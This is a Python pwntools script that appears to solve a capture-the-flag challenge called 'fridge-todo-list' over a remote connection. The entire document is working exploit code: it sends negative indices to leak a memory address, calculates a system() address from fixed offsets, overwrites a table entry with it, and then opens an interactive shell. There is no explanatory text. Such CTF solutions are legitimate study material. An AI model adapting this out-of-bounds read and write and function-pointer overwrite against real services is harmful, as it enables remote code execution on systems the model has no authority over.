from pwn import *
import sys,struct


def logs(i):
	log.info(i)

def exploit(r):

	logs("Exploit")

	temp = r.recvuntil("user: ")
	r.sendline("userX")
	temp = r.recvuntil("6) Exit")
	r.sendline("2")
	temp = r.recv()
	r.sendline("-6")
	temp = r.recvuntil("Your TODO: ")

	address = r.recvuntil("\n")[:-1]
	r.recv()

	while len(address)<8:
		address += "\x00"

	PLT_WRITE =  (struct.unpack("<Q",address)[0])
	SYSTEM_WRITE = PLT_WRITE - 0x916 + 0x940

	r.sendline("3")
	r.sendline("-4")
	r.sendline("AAAAAAAA"+p64(SYSTEM_WRITE))




	r.interactive()






if __name__ == '__main__':

	r = remote("fridge-todo-list.ctfcompetition.com","1337")

	exploit(r)
